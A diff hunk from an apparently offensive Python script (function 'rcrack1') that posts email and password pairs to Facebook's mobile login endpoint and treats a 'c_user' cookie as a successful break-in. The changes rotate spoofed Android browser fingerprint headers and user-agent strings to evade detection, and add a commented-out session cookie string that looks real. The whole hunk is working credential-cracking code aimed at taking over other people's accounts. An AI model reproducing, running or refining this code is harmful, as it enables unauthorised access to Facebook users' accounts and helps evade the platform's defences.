@@ -195,24 +195,25 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb ={'authority': 'm.facebook.com',
+            header_freefb ={'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
+    # 'cookie': 'datr=we9YZSUtdDj-EQec8tRJ9aN-; sb=we9YZRuStSky6zf0zf8TciuI; locale=en_US; vpd=v1%3B676x360x2; m_pixel_ratio=2; wd=360x676; fr=0TSO0NmPdHr2tfpKE.AWUSeFkrIJxI3Z-yTMgInPSUUug.BlWO_B.Ij.AAA.0.0.BlXaJc.AWXdnf0On9w',
     'dpr': '2',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"RMX2101"',
+    'sec-ch-ua-model': '"TECNO LD7"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
             lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
